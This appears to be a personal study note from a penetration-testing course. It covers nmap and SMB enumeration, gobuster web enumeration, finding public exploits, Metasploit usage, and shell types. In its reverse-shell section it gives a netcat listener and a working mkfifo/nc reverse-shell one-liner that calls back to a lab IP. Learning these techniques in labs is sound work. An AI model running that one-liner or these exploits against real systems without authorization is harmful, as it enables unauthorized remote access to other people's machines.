# Pentesting Basics

## Getting a shell
- **types of shell**
	- Reverse Shell
	- Bind Shell
	- Web Shell
- **Netcat**
	- interacting with TCP/UDP ports.
	- **Banner Grabbing** `nc -nv 10.129.42.253 21` or `nmap -sV --script=banner <target>`

## Service Scanning
### Nmap
- `-sC` for more details `-sV` for version `-p-` to scan all ports 
- to run custom script `nmap --script <script name> -p<port> <host>`.
### Attacking Network Services
- **Banner Grabbing** `nmap -sV --script=banner <target>`  
- **FTP**: Nmap scan anonymous authentication is enabled
#### SMB (Server Message Block)
- a prevalent protocol on Windows machines
- some SMB versions may be vulnerable to RCE exploits such as [EternalBlue](https://www.avast.com/c-eternalblue).
- `nmap --script smb-os-discovery.nse -p445 10.10.10.40`
##### Shares
- SMB allows users and administrators to share folders and make them accessible remotely by other users
- `smbclient -N -L \\\\10.129.42.253` when `-L` fir list and `-N` suppresses the password prompt
	- `smbclient \\\\10.129.42.253\\users` connect as guest
	- `smbclient -U bob \\\\10.129.42.253\\users` connect as user bob

## Web Enumeration
- `whatweb 10.129.117.36` 
### Gobuster (or ffuf)
- for dirs/files
```bash
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
- for subdomains
```bash
# we can use this repo to dowload wordList
git clone https://github.com/danielmiessler/SecLists
# now Gobuster
gobuster dns -do inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.tx
```
### Web Enumeration Tips (info sources)
- **Banner Grabbing / Web Server Headers**
- **Whatweb**: by command `shell-session
 whatweb 10.10.10.121`
 - **Certificates**
 - **robots.txt**: instruct search engine like google
 - **source code**: by `ctrl+u`
 - 
## Public Exploits
### Finding Public Exploits
- using google with `exploit`  word
- **searchsploit (from exploitDb)**, or other databases like: [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/),, [Vulnerability Lab](https://www.vulnerability-lab.com/).

### Metasploit Primer (`msfconsole`)
- Metasploit is a powerful pentesting framework with 
	- built-in exploits
	- reconnaissance/verification scripts
	- the Meterpreter shell
	- post-exploit/pivoting utilities.
- `msfconsole` command to run **Metasploit**
	1 - `search exploit SMB` command to for SMB vuln  
	2 - `use exploit/windows/...` use the exploit 
	3 - `show options` to display and config exploit options
	4 - `set RHOSTS 10.10.10.40` to set params (**RHost** for target and **LHost** of our attacker like `eth0`)
	5- `check` to check if our target is vulnerable
	6- `run` or `exploit` to run the exploit in the end	

# Types of Shells
- to remote access: `ssh` for linux and `WinRm` for windows 

Type of Shell | Method of Communication
|--|--|
`Reverse Shell` |Connects back to our system and gives us control through a reverse connection.
`Bind Shell` | Waits for us to connect to it and gives us control once we do.
`Web Shell`  | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.
## Reverse Shell
- most used
- **netcat** listener on our machine  `nc -lvnp 1234`
- [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) : reverse shell commands, example :
	```bash
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
	```
- **lose connection:** have to use the initial exploit again
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTEwODE3MTU3MzAsLTExNzk3NTEyMTUsLT
E5NjQ5NDM4ODgsMTQ2MjE1MTkzLDY4MTMzMTc0OSw5MjIyNDU1
MDcsMTQxNjU5OTA3MiwtNTcyODQ4MDQxLDE1MzUyMzQ5NjEsND
A4NDI4OTg1LC0xNDc0MjAzNjI5LC0xMDAxMzcwMDQyLC0xNTkz
OTA0MjMyLDY4MjcwMjY1OCwtNTc4MzIxMTkwLDgxMTA2OTAxNS
wtMjA4ODc0NjYxMl19
-->